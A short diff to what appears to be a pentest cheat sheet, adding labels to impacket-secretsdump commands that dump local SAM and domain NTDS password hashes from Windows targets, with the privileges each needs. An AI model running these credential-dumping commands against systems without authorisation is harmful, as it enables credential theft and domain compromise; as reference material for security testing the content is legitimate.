@@ -203,8 +203,10 @@ impacket-secretdump -ntds NTDS.dit(C:\windows\ntds\) -system SYSTEM local0
 ```
 ### impacket-secretsdump
 ```
+dump local user hash:
 impacket-secretdump domain/username:password@targeted-ip -sam -system(by smb, need local admin or equivalent privilege)
 
+dump domain user hash:
 impacket-secretsdump domain/username:password@targeted-ip(by drsuapi, need domain admin or equivalent privilege)
 ```
 
